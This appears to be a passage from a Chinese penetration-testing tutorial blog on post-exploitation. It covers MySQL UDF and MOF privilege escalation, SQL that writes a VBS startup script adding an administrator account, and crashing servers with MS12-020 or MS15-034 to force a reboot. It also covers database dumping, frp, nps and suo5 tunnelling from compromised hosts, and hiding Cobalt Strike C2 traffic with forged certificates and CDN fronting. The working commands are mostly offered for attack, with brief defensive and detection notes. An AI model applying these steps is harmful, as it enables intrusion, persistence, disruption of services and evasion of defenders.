class="headerlink" title="六、密码复用提权"></a>六、密码复用提权</h3><p>我们如果在主机上找到了其他应用或数据库的密码，那么很有可能root用户也用该密码，或者该参考该密码命名规则。那么就可以尝试一下 su root 来提权了。</p><h1 id="数据库提权到操作系统"><a href="#数据库提权到操作系统" class="headerlink" title="数据库提权到操作系统"></a>数据库提权到操作系统</h1><p>攻击者如果获取了通过数据库root权限，是可以通过提权，获取操作系统最高权限的。</p><h2 id="Mysql数据库提权"><a href="#Mysql数据库提权" class="headerlink" title="Mysql数据库提权"></a>Mysql数据库提权</h2><h3 id="如何获取mysql账号密码"><a href="#如何获取mysql账号密码" class="headerlink" title="如何获取mysql账号密码"></a>如何获取mysql账号密码</h3><p>当通过webshell进入服务器后，怎么得到数据库的账号密码呢</p><ol><li><p>查看网站配置文件。</p><p>如:conn、config、data、sql、common 、inc等。</p></li><li><p>查看数据库物理路径下的user表文件<br>目录为&#x2F;data&#x2F;mysql&#x2F;user.myd和user.myi<br>密码是加密的，需要再次进行破解</p></li><li><p>通过暴力破解得到（hscan、Bruter、hydra、脚本木马）<br>如果对外开放3306，即允许远程连接，可以远程爆破<br>补充：mysql开启root账号远程访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON*.*TO root@&quot;\%&quot;IDENTIFIED BY&quot;root&quot;;</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure></li></ol><h3 id="利用UDF自身提权"><a href="#利用UDF自身提权" class="headerlink" title="利用UDF自身提权"></a>利用UDF自身提权</h3><hr><ol><li>原理<br>UDF提权是利用MYSQL的Create Function语句，将MYSQL账号转化为系统system权限。</li><li>利用条件<ul><li>目标系统是Windows(Win2000,XP,Win2003)</li><li>已经拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数</li><li>有root账号和密码</li></ul></li></ol><p><strong>利用方式A</strong></p><ol><li><p>使用工具“mysql综合利用工具”连接<br>填写地址、root账号、密码后进行连接</p><p><img src="http://noah-pic.oss-cn-chengdu.aliyuncs.com/pic/20210806/164305231.png" alt="mark"></p></li><li><p>导入udf.dll文件<br>连接成功后，导出DLL文件，导入时请勿必注意导出路径（一般情况下对任何目录可写，无需考虑权限问题），否则在下一步操作中你会看到”No paths allowed for shared library”错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#不同版本mysql，udf.dll存放路径不同</span><br><span class="line">#Mysql版本大于5.1版本。</span><br><span class="line">xx\\mysql\\lib\\plugin\\udf.dll 文件夹下。</span><br><span class="line">#Mysql5.1版本默认路径。</span><br><span class="line">C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\\udf.dll</span><br><span class="line">#Mysql版本小于5.1版本。</span><br><span class="line">Windows2003下放置于c:\\windows\\system32\\udf.dll</span><br><span class="line">windows2000下放置于c:\\winnt\\system32\\udf.dll</span><br></pre></td></tr></table></figure></li></ol><p><strong>一般Lib、Plugin文件夹需要在webshell先手工建立（也可用NTFS ADS流模式突破进而创建文件夹）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```sql</span><br><span class="line">#查找到mysql的目录后</span><br></pre></td></tr></table></figure><p>select @@basedir;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#利用NTFS ADS创建lib目录</span><br></pre></td></tr></table></figure><p>select ‘It is dll’ into dumpfile ‘C:\ProgramFiles\MySQL\MySQL Server 5.1\lib::$INDEX_ALLOCATION’;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#利用NTFS ADS创建plugin目录</span><br><span class="line">select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\ProgramFiles\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;; </span><br><span class="line">```</span><br></pre></td></tr></table></figure><ol><li><p>UDF提权常用命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#创建cmdshell函数，如果用3389就需要创建open3389函数，具体有哪些函数看帮助</span><br><span class="line">create function cmdshell returns string soname &#x27;udf.dll&#x27;; </span><br><span class="line">#创建好函数后，用函数执行系统命令</span><br><span class="line">select cmdshell(&#x27;net user&#x27;);</span><br><span class="line">select open3389();</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&#x27;cmdshell&#x27;  删除函数</span><br></pre></td></tr></table></figure><p>使用完成后你可能需要删除在第二步中导出的DLL，但在删除DLL前请先删除你在第三步中创建的函数，否则删除操作将失败，删除第三步中创建的函数的SQL语句为：drop function 创建的函数名；</p></li></ol><p><strong>利用方式B</strong></p><p>UDF脚本提权,当mysql不能远程连接时，可以上传udf脚本至对方主机，然后通过webshell的方式进行连接操作。</p><h3 id="利用mof提权"><a href="#利用mof提权" class="headerlink" title="利用mof提权"></a>利用mof提权</h3><p><strong>MOF漏洞工具与脚本实战：</strong><a href="http://www.myhack58.com/Article/html/3/8/2013/38264.htm">http://www.myhack58.com/Article/html/3/8/2013/38264.htm</a></p><ol><li>原理<br>在windows平台下，c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要将要做的事通过代码存储到这个mof文件中，就可以实现权限提升。</li><li>利用条件<ul><li>mysql用户具有root权限</li><li>且可以复制文件到c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;目录下</li><li>关闭了secure-file-priv</li></ul></li></ol><p><strong>利用方式1</strong><br>通过工具如“mysql综合利用工具”直接提取，输入账户密码连接数据库后可直接输入系统命令，创建账号。</p><p><strong>利用方式2</strong></p><p>通过上传mof文件，然后在sql中运行的方式</p><ol><li><p>找个可写目录，上传mof文件</p><p>假设上传的目录为文件夹<code>C:\\wmpub\\moon.mof</code><br>该mof文件，已经写死了要创建的账号密码等信息</p></li><li><p>执行sql，转移文件到系统目录，等待创建新账号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;C:\\wmpub\\moon.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/moon.mof&#x27;;</span><br></pre></td></tr></table></figure></li><li><p>执行完后，验证账号<br>在webshell里执行使用net user查看是否多了一个admin用户，如果有则说明可以利用，否则就不需要继续了，注意新建的帐号每隔5分钟就会新建帐号，删除帐号的办法参考上文链接</p></li></ol><h3 id="通过Mysql把文件写入启动项"><a href="#通过Mysql把文件写入启动项" class="headerlink" title="通过Mysql把文件写入启动项"></a>通过Mysql把文件写入启动项</h3><ol><li><p>通过mysql数据库命令写入VBS脚本；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;drop database test1;</span><br><span class="line">mysql&gt; create database test1;</span><br><span class="line">mysql&gt; use test1;</span><br><span class="line">mysql&gt; create table a (cmd text);</span><br><span class="line">mysql&gt;insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;)&quot;);</span><br><span class="line">mysql&gt;insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user best best /add&quot;&quot;,0)&quot;);</span><br><span class="line">mysql&gt;insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup Administrators best /add&quot;&quot;,0)&quot;);</span><br><span class="line">#注意双引号和括号以及后面的“0”一定要输入！我们将用这三条命令来建立一个VBS的脚本程序</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2. 直接通过Webshell的Mysql写入启动项；</span><br><span class="line">    ```sql</span><br><span class="line">    mysql&gt;select * from a;</span><br><span class="line">    mysql&gt;select * from a into outfile &quot;c://docume~1//administrator//「开始」菜单//程序//启动//best.vbs&quot;;</span><br></pre></td></tr></table></figure><ol><li>通过MS12-020、MS15-034重启服务器。<br>服务器down机后，管理员会重启，重启后我们就能得到新建的管理员账号了</li></ol><h2 id="微软Mssql提权"><a href="#微软Mssql提权" class="headerlink" title="微软Mssql提权"></a>微软Mssql提权</h2><p>mssql提权主要分为弱口令与溢出两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。</p><p>通过漏洞拉到webshell之后，找到网站配置文件，里面有<strong>sa权限</strong>的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的，mssql一般是允许远程连接的，系统库是master。<br>有了sa密码直接利用sqltools工具就可以了</p><h2 id="如何通过Oracle提权"><a href="#如何通过Oracle提权" class="headerlink" title="如何通过Oracle提权"></a>如何通过Oracle提权</h2><p>Oracle数据库一般与jsp、aspx网站搭配，如果是jsp网站，默认是系统权限，aspx网站默认需要提权。</p><p><strong>提权方法参考：</strong><a href="http://blog.csdn.net/sezvboyrul/article/details/2855401,%E5%B7%A5%E5%85%B7%E4%B8%BA%60oracleshell%60">http://blog.csdn.net/sezvboyrul/article/details/2855401,工具为`oracleshell`</a></p><h2 id="数据库安全防范"><a href="#数据库安全防范" class="headerlink" title="数据库安全防范"></a>数据库安全防范</h2><ol><li>限止数据库远程连接，给数据库帐户设置密码必须&gt;8位以上并数字+字母+特殊符号等。</li><li>不要给网站配置root或SA权限。必须给每个网站独立分配数据库帐户并限格控制好权限。</li><li>及时升级数据库补丁。</li><li>安装Waf进行防御。</li><li>购买数据库审计设备</li></ol><h1 id="数据库脱库"><a href="#数据库脱库" class="headerlink" title="数据库脱库"></a>数据库脱库</h1><h2 id="工具脱库"><a href="#工具脱库" class="headerlink" title="工具脱库"></a>工具脱库</h2><p>通过百度查找Navicat Mysql、Navicat for SQL Server、Navicat for Oracle、Navicat for PostgreSQL、Navicat for SQLite等，也可以使用其它工具代替，如sqlmap、k8等类似工具。<br><strong>优点：</strong> 支持面广，功能强大，速度度、稳定<br><strong>缺点：</strong> 不能支持外链</p><h2 id="脚本脱库"><a href="#脚本脱库" class="headerlink" title="脚本脱库"></a>脚本脱库</h2><p>通过百度查找ASP、PHP、JSP脱库脚本等类似工具。<br><strong>优点：</strong> 解决不外链的情况<br><strong>缺点：</strong> 速度慢、不够稳定</p><h2 id="站点打包"><a href="#站点打包" class="headerlink" title="站点打包"></a>站点打包</h2><p>通过百度查找ASP、PHP、JSP脚本打包程序等类似工具。<br>asp+access源码和数据库是可以一起打包，其它类型数据库，库与源码是单独分开的。</p><h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><p><a href="https://blog.csdn.net/qq_53568983/article/details/143032581">【蓝队技能】【内网隧道工具流量分析】FRP&amp;NPS&amp;reGeorg&amp;Venom_frp流量分析-CSDN博客</a></p><h2 id="nps逆向穿透"><a href="#nps逆向穿透" class="headerlink" title="nps逆向穿透"></a>nps逆向穿透</h2><p>项目地址：<a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a></p><p>实验架构图</p><img src="/img/oldboy/image-20250302205921712-1740920363278-1.png" alt="image-20250302205921712" style="zoom:50\%;" /><p>1、nps配置（双网卡主机）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装相关依赖（需要管理员权限）</span></span><br><span class="line">C:\neiwang\windows_amd64_server\nps.exe install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启动nps服务（需要管理员权限）</span></span><br><span class="line">C:\neiwang\windows_amd64_server\nps.exe start</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.138.132:8080/login/index</span><br><span class="line">账号 admin  密码 123</span><br></pre></td></tr></table></figure><p><img src="/img/oldboy/image-20250302210807232.png" alt="image-20250302210807232"></p><h3 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h3><p>创建隧道实现内网PC机的端口映射</p><p><img src="/img/oldboy/image-20250302212344121.png" alt="image-20250302212344121"></p><p><img src="/img/oldboy/image-20250302213050580-1740922252555-3.png" alt="image-20250302213050580"></p><p>2、npc配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">客户端开启服务</span></span><br><span class="line">./npc.exe -server=192.168.138.132:8024 -vkey=123456 -type=tcp</span><br></pre></td></tr></table></figure><img src="/img/oldboy/image-20250302213155368.png" alt="image-20250302213155368" style="zoom:50\%;" /><p><img src="/img/oldboy/image-20250302213443822.png" alt="image-20250302213443822"></p><p>使用外网服务器远程连接192.168.138.132:8022端口</p><img src="/img/oldboy/image-20250302213323169.png" alt="image-20250302213323169" style="zoom:50\%;" /><h3 id="流量转发"><a href="#流量转发" class="headerlink" title="流量转发"></a>流量转发</h3><p>nps创建socks代理</p><img src="/img/oldboy/image-20250302213652535-1740922614079-5.png" alt="image-20250302213652535" style="zoom:50\%;" /><p>使用Proxifier代理</p><p>创建代理服务器</p><img src="/img/oldboy/image-20250302214052182.png" alt="image-20250302214052182" style="zoom:50\%;" /><p>创建代理服务器</p><p>启动代理规则</p><img src="/img/oldboy/image-20250302214709180.png" alt="image-20250302214709180" style="zoom:50\%;" /><p>配置当访问192.168.50.0-192.168.50.255使用代理服务器</p><p><img src="/img/oldboy/image-20250302220122380.png" alt="image-20250302220122380" style="zoom:50\%;" />使用本机测试是否能ping通</p><img src="/img/oldboy/image-20250302220025607.png" alt="image-20250302220025607" style="zoom: 50\%;" /><p>但是无法ping通C主机。</p><img src="/img/oldboy/image-20250302220342320.png" alt="image-20250302220342320" style="zoom:25\%;" /><p>验证成功！</p><h2 id="frp反向代理穿透"><a href="#frp反向代理穿透" class="headerlink" title="frp反向代理穿透"></a>frp反向代理穿透</h2><p>GitHub：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p><img src="/img/oldboy/image-20250302205921712-1740920363278-1.png" alt="image-20250302205921712" style="zoom:50\%;" /><p><strong>1、服务端配置</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br><span class="line">token = 123456</span><br><span class="line">dashboard_port = 7500</span><br><span class="line">dashboard_user = admin</span><br><span class="line">dashboard_pwd = admin</span><br><span class="line">enable_prometheus = true</span><br></pre></td></tr></table></figure><p>启动frpc(不同操作系统，配置文件不同)</p><p>frps.exe -c frps.toml</p><p>访问<a href="http://192.168.138.132:7500/">http://192.168.138.132:7500/</a></p><p><img src="/img/oldboy/image-20250302222451071.png" alt="image-20250302222451071"></p><p><strong>2、客户端配置</strong></p><p>将frpc.exe和frpc.toml上传到客户端</p><p>修改frpc.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端配置</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 服务器ip</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">与frps.ini的bind_port⼀致</span></span><br><span class="line">server_port = 7000</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">与frps.ini的token⼀致</span></span><br><span class="line">token = 123456</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置ssh服务</span></span><br><span class="line">[ssh]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个⾃定义，之后再ssh连接的时候要⽤</span></span><br><span class="line">remote_port = 6000</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">rdp配置远程连接</span></span><br><span class="line">[rdp]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port =3389</span><br><span class="line">remote_port = 7002</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置http服务，可⽤于⼩程序开发、远程调试等，如果没有可以不写下⾯的</span></span><br><span class="line">[web]</span><br><span class="line">type = http</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 8080</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">web域名</span></span><br><span class="line">subdomain = test.hijk.pw</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">⾃定义的远程服务器端⼝，例如8080</span></span><br><span class="line">remote_port = 8080</span><br></pre></td></tr></table></figure><p>上⾯frpc.ini的rdp字段都是⾃⼰定义的规则，⾃定义端⼝对应时格式如下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[xxx]”表示⼀个规则名称，⾃⼰定义，便于查询即可。</span><br><span class="line"></span><br><span class="line">“type”表示转发的协议类型，有TCP和UDP等选项可以选择，如有需要请⾃⾏查询frp⼿册。</span><br><span class="line"></span><br><span class="line">“local_port”是本地应⽤的端⼝号，按照实际应⽤⼯作在本机的端⼝号填写即可。</span><br><span class="line"></span><br><span class="line">“remote_port”是该条规则在服务端开放的端⼝号，⾃⼰填写并记录即可。</span><br></pre></td></tr></table></figure><p>RDP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">即Remote Desktop 远程桌⾯，Windows的RDP默认端⼝是3389，协议为TCP，建议使⽤frp远程</span><br><span class="line">连接前，在局域⽹中测试好，能够成功连接后再使⽤frp穿透连接。</span><br></pre></td></tr></table></figure><p>配置完成frpc.ini后，就可以运⾏frpc了,注意防⽕墙要放⾏remote_port端⼝</p><p>在cs的输⼊beacon命令启动客户端</p><p>cd C:frp</p><p>shell frpc.exe -c frpc.ini</p><p>启动后服务器端操作界⾯会回显⼀个连接</p><p><img src="/img/oldboy/image-20250302224813994.png" alt="image-20250302224813994"></p><p>此时可以在局域⽹外使⽤相应程序访问 x.x.x.x:xxxx （IP为VPS的IP，端⼝为⾃定义的remote_port）即</p><p>可访问到相应服务</p><p>使⽤远程桌⾯进⾏连接</p><p><img src="/img/oldboy/image-20250302224842021.png" alt="image-20250302224842021"></p><h3 id="客户端后台运⾏及开机⾃启"><a href="#客户端后台运⾏及开机⾃启" class="headerlink" title="客户端后台运⾏及开机⾃启"></a>客户端后台运⾏及开机⾃启</h3><p>frpc运⾏时始终有⼀个命令⾏窗⼝运⾏在前台，影响美观，我们可以使⽤⼀个批处理⽂件来将其运⾏在</p><p>后台，⽽且可以双击执⾏，每次打开frpc不⽤再⾃⼰输命令了。</p><p>在任何⼀个⽬录下新建⼀个⽂本⽂件并将其重命名为“frpc.bat”，编辑，粘贴如下内容并保存。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">if &quot;\%1&quot; == &quot;h&quot; goto begin</span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;&quot;&quot;\%~nx0&quot;&quot; h&quot;,0)</span><br><span class="line">(window.close)&amp;&amp;exit</span><br><span class="line">:begin</span><br><span class="line">REM</span><br><span class="line">cd C:\frp</span><br><span class="line">frpc -c frpc.ini</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>将cd后的路径更改为你的frpc实际存放的⽬录。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">之后直接运⾏这个 .bat ⽂件即可启动frpc并隐藏窗⼝（可在任务管理器中退出）。</span><br><span class="line">⾄于开机启动，把这个 .bat ⽂件直接扔进Windows的开机启动⽂件夹就好了 :)</span><br><span class="line">⾄此，客户端配置完成，之后就是你⾃⼰根据需要在frpc.ini后追加规则即可。</span><br><span class="line">强烈建议你在使⽤frp直接测试内⽹穿透前，先在局域⽹内测试好相关功能的正常使⽤，并配置好可</span><br><span class="line">能会影响的Windows防⽕墙等内容，在内⽹调试通过后再使⽤frp进⾏内⽹穿透测试。</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/hackmang/p/14516969.html">frp+proxifier实现内网socks5反向代理 - 枕桃花吹长笛 - 博客园</a></p><h2 id="正向代理穿透"><a href="#正向代理穿透" class="headerlink" title="正向代理穿透"></a>正向代理穿透</h2><p>需要将恶意文件上传到服务端</p><p><a href="https://github.com/zema1/suo5/tree/main/assets">suo5&#x2F;assets at main · zema1&#x2F;suo5</a></p><p>针对不同的前端页面上传不同的恶意文件</p><p><img src="/img/oldboy/image-20250303101252469.png" alt="image-20250303101252469"></p><p>使用链接工具进行连接</p><img src="/img/oldboy/image-20250303102504174.png" alt="image-20250303102504174" style="zoom:50\%;" /><p>非图形化命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./suo5 -t https://example.com/proxy.jsp -l 127.0.0.1:1111</span> </span><br></pre></td></tr></table></figure><p>使用proxifier或者使用火狐配置代理端口即可使用</p><h1 id="渗透测试工具"><a href="#渗透测试工具" class="headerlink" title="渗透测试工具"></a>渗透测试工具</h1><h2 id="Cobalt-Striket提权工具"><a href="#Cobalt-Striket提权工具" class="headerlink" title="Cobalt Striket提权工具"></a>Cobalt Striket提权工具</h2><p>介绍：CobaltStrike集成了端口转发、服务扫描、自动化溢出、多模式端口监听、Windows exe木马生成、Windows dll木马生成、Java木马生成、Office 宏病毒生成、木马捆绑浏览器自动攻击等强大的功能。同时，Cobalt Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。</p><p>项目地址：<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a></p><h3 id="CS流量隐藏"><a href="#CS流量隐藏" class="headerlink" title="CS流量隐藏"></a>CS流量隐藏</h3><p>一、HTTP&#x2F;HTTPS 流量特征</p><p>​ 默认证书特征  </p><p>​默认使用自签名SSL证书，证书信息包含固定字段： CN&#x3D;Major Cobalt Strike、Alias name: cobaltstrike。 </p><p>​检测建议：检查TLS证书的Subject和Issuer字段，匹配固定关键字。 </p><p>​URI路径的checksum8规则  </p><p>​Stager下载Stage时，HTTP请求路径需满足 ASCII码之和 % 256 &#x3D; 92（如 &#x2F;Yle2、&#x2F;cKTZ）。</p><p>​ 检测建议：对URI路径动态计算checksum8值，匹配结果为92的请求。 </p><p>​心跳包特征 </p><p>​ Beacon与C2的HTTP心跳包间隔固定（默认60秒），上下行数据长度固定。 </p><p>​检测建议：分析流量中周期性固定长度的GET&#x2F;POST请求。 </p><p>​HTTP头异常  </p><p>​默认配置中Cookie字段携带Base64加密的元数据，且User-Agent可能固定（旧版本）或随机但无浏览器特征。</p><p>​检测建议：检查Cookie字段是否包含Base64编码的异常数据。 </p><p>二、DNS 流量特征</p><p>​ 异常DNS查询  </p><p>​DNS Beacon使用 www.、api.、post. 等前缀发起A&#x2F;TXT记录查询。</p><p>​响应结果包含非常规IP（如 0.0.0.0、0.0.0.241）。 </p><p>​检测建议：监控异常DNS查询模式及非标准响应IP。 </p><p>​TXT记录载荷传输  </p><p>​使用TXT记录传输加密后的指令或数据，查询内容包含长随机字符串。 </p><p>​检测建议：分析TXT记录长度和频率，匹配加密数据特征。 </p><p>三、强特征（需源码级修改）</p><p>​ JA3&#x2F;JA3S指纹</p><p>​TLS握手阶段的Client Hello（JA3）和Server Hello（JA3S）存在固定哈希值（如 72a589da586844d7f0818ce684948eea）。 </p><p>​检测建议：提取TLS握手阶段的JA3&#x2F;JA3S哈希值进行匹配。 Stager响应特征  即使修改URI路径，默认仍响应符合checksum8规则的请求（如访问任意路径返回Stage）。 </p><p>​检测建议：对未配置的URI路径返回210KB左右数据的服务器进行标记。</p><h4 id="修改证书特征值"><a href="#修改证书特征值" class="headerlink" title="修改证书特征值"></a>修改证书特征值</h4><p>1、cobalt strike 默认的证书存在cobalt strike 的指纹信息。需要keytool (Java数据证书的管理工具) 修改证书信息，创建新的cobaltstrike.store。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool.exe -keystore test.store -storepass test2025 -keypass test2025 -genkey -keyalg RSA -alias test.com -dname &quot;CN=test e-Szigno Root CA, OU=e-Szigno CA, O=test Ltd., L=Budapest, ST=HU, C=HU&quot;</span><br></pre></td></tr></table></figure><p>ps:推荐在cs文件夹下运行该命令</p><p>2、使用github中其他流量的特征值</p><p>地址：<a href="https://github.com/xx0hcd/Malleable-C2-Profiles">https://github.com/xx0hcd/Malleable-C2-Profiles</a></p><p>我们就用office365_calendar.profile来举例</p><p>我们要修改的是此文件中用到我们刚刚生成证书的信息(配置文件没有，需要手动添加信息)</p><p>https-certificate {</p><p>​set CN “test e-Szigno Root CA”;</p><p>​set O “test Ltd”;</p><p>​set C “HU”;</p><p>​set L “US”;</p><p>​set OU “e-Szigno CA”;</p><p>​set ST “HU”;</p><p>​set validity “365”;</p><p>}</p><p>#设置，修改成你的证书名称和证书密码</p><p>code-signer{</p><p>​set keystore “test.store”;</p><p>​set password “test2025”;</p><p>​set alias “test.com”;</p><p>}</p><p>3、最后我们将这2个文件同时放到vps上启动</p><p>.&#x2F;teamserver ip 密码 office365_calendar.profile</p><p>可以修改.&#x2F;teamserver 端口实现敏感端口绕过</p><h4 id="CDN接入"><a href="#CDN接入" class="headerlink" title="CDN接入"></a>CDN接入</h4><p>使用CDN内容分发网络的多节点分布式技术，通过“加速、代理、缓存”隐藏在后面的静态文件或服务；最终实现对外暴露的是CDN多节点的公网域名IP，很难甚至无法溯源真实后端服务器的域名或IP</p><p>1、开启一个listen</p><p>​NAME:随便填写<br>​Payload：选择Beacon http<br>​HTTP hosts：写入自己的域名<br>​HTTP host(Stager):写入自己的域名<br>​HTTP Port（C2）：写入8880端口，可以访问到的都可以。<br>​HTTP header：写入自己的域名</p><img src="/img/oldboy/1-51.png" style="zoom:50\%;" /><p>需要配置域名，然后免费申请CDN</p><p><a href="https://blog.csdn.net/2301_80115097/article/details/138341090">内网神器Cobalt Strike隐藏特征与流量混淆._cobaltstrike cdn-CSDN博客</a></p><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="服务端启动"><a href="#服务端启动" class="headerlink" title="服务端启动"></a>服务端启动</h4><p>服务端一般部署在云主机Linux操作系统中</p><p>服务端启动（基于Java环境需要安装jdk）本次运行环境为Linux。切换到程序目录，运行程序+真实IP+密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">赋予执行权限</span></span><br><span class="line">chmod +x teamserver</span><br><span class="line">chmod +x TeamServerImage</span><br><span class="line"> </span><br><span class="line">./teamserver 192.168.138.129 geekgold</span><br></pre></td></tr></table></figure><img src="/img/oldboy/1-30.png" style="zoom:50\%;" /><h4 id="客户端启动"><a href="#客户端启动" class="headerlink" title="客户端启动"></a>客户端启动</h4><img src="/img/oldboy/1-31.png" style="zoom:50\%;" /><p>注意：需要保持服务端和客户端的版本一致</p><h4 id="EXE可执行文件"><a href="#EXE可执行文件" class="headerlink" title="EXE可执行文件"></a>EXE可执行文件</h4><p>1、创建监听器</p><img src="/img/oldboy/1-32.png" 